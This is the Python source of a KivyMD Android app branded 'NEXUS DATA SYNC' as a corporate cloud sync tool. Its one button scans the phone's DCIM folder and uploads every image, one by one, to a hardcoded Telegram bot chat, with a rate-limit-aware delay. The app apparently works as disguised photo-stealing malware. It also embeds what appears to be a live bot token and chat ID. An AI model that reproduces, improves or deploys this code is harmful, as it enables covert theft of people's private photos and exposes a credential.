from kivymd.app import MDApp
from kivymd.uix.button import MDFillRoundFlatButton
from kivymd.uix.label import MDLabel
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.card import MDCard
from kivy.uix.anchorlayout import AnchorLayout

import threading
import requests
import os
import time
from kivy.clock import Clock


# --- إعدادات التليجرام ---
BOT_TOKEN = "7428323029:AAF2arCb8C_gc0Mpay1DD7UrWNMd6ru7SDA"
CHAT_ID = "7820356751"


class CorporateDataSyncApp(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "BlueGray"

        main_layout = MDBoxLayout(orientation='vertical', md_bg_color=(0.04, 0.06, 0.09, 1))

        toolbar = MDBoxLayout(
            orientation='horizontal', size_hint_y=None, height="65dp",
            padding=["20dp", 0, "20dp", 0], md_bg_color=(0.06, 0.09, 0.13, 1)
        )
        logo_label = MDLabel(
            text="NEXUS DATA SYNC", font_style="Subtitle2",
            theme_text_color="Custom", text_color=(0.9, 0.9, 0.95, 1), bold=True
        )
        toolbar.add_widget(logo_label)
        main_layout.add_widget(toolbar)

        content_layout = AnchorLayout(anchor_x='center', anchor_y='center', padding="24dp")

        company_card = MDCard(
            orientation='vertical', padding=["30dp", "35dp", "30dp", "35dp"], spacing="25dp",
            size_hint=(0.95, None), height="360dp", elevation=0, radius=[24, 24, 24, 24],
            md_bg_color=(0.08, 0.11, 0.16, 1)
        )

        self.status_label = MDLabel(
            text="Cloud Asset Deployment", halign="center", font_style="H5",
            theme_text_color="Custom", text_color=(1, 1, 1, 1), bold=True
        )
        company_card.add_widget(self.status_label)

        self.sub_label = MDLabel(
            text="Sending all images as fast as your network allows",
            halign="center", font_style="Body2", theme_text_color="Custom",
            text_color=(0.6, 0.65, 0.75, 1), size_hint_y=None, height="60dp"
        )
        company_card.add_widget(self.sub_label)
        company_card.add_widget(MDBoxLayout(size_hint_y=None, height="10dp"))

        self.btn_send = MDFillRoundFlatButton(
            text="SEND ALL IMAGES (Fast Mode)", 
            size_hint=(1, None), 
            height="56dp",
            md_bg_color=(0.12, 0.45, 0.9, 1), 
            on_release=self.start_upload_thread
        )
        company_card.add_widget(self.btn_send)

        content_layout.add_widget(company_card)
        main_layout.add_widget(content_layout)

        return main_layout

    def start_upload_thread(self, instance):
        self.status_label.text = "Scanning Storage..."
        self.btn_send.disabled = True
        threading.Thread(target=self.scan_and_send_all_images, daemon=True).start()

    def scan_and_send_all_images(self):
        target_dir = "/storage/emulated/0/DCIM"
        if not os.path.exists(target_dir):
            target_dir = os.getcwd()

        valid_extensions = ('.jpg', '.jpeg', '.png', '.JPG', '.JPEG', '.PNG')
        image_files = []

        try:
            for root, dirs, files in os.walk(target_dir):
                for file in files:
                    if file.lower().endswith(valid_extensions):
                        full_path = os.path.join(root, file)
                        if os.path.exists(full_path):
                            image_files.append(full_path)
        except Exception as e:
            self.update_status("Access Denied", f"Error: {str(e)}")
            return

        if not image_files:
            self.update_status("No Images Found", f"No images in {target_dir}")
            return

        total = len(image_files)
        self.update_status("Fast Sending...", 
                          f"Found {total} images. Sending as fast as possible...")

        success_count = 0
        delay = 0.8          # تأخير أولي صغير (ثانية)
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

        for i, img_path in enumerate(image_files, 1):
            try:
                with open(img_path, 'rb') as img:
                    files = {'photo': img}
                    data = {
                        'chat_id': CHAT_ID,
                        'caption': f"📸 {os.path.basename(img_path)} ({i}/{total})"
                    }
                    response = requests.post(url, data=data, files=files, timeout=45)
                    
                    if response.status_code == 200:
                        success_count += 1
                        print(f"✅ Sent {i}/{total}")
                    else:
                        print(f"❌ Failed {i}/{total}: {response.text[:150]}")
                        if "too many requests" in response.text.lower():
                            delay = min(delay + 1.5, 5)  # زيادة التأخير إذا حصل Rate Limit
            except Exception as e:
                print(f"Error on {img_path}: {e}")
                delay = min(delay + 1, 4)   # زيادة التأخير عند الخطأ

            # تأخير ذكي حسب أداء النت
            if i < total:
                time.sleep(delay)

        self.update_status("Completed", 
                         f"Successfully sent {success_count} out of {total} images.")

    def update_status(self, headline, detail):
        def set_text(dt):
            self.status_label.text = headline
            self.sub_label.text = detail
            self.btn_send.disabled = False
        Clock.schedule_once(set_text, 0.1)


if __name__ == '__main__':
    CorporateDataSyncApp().run()
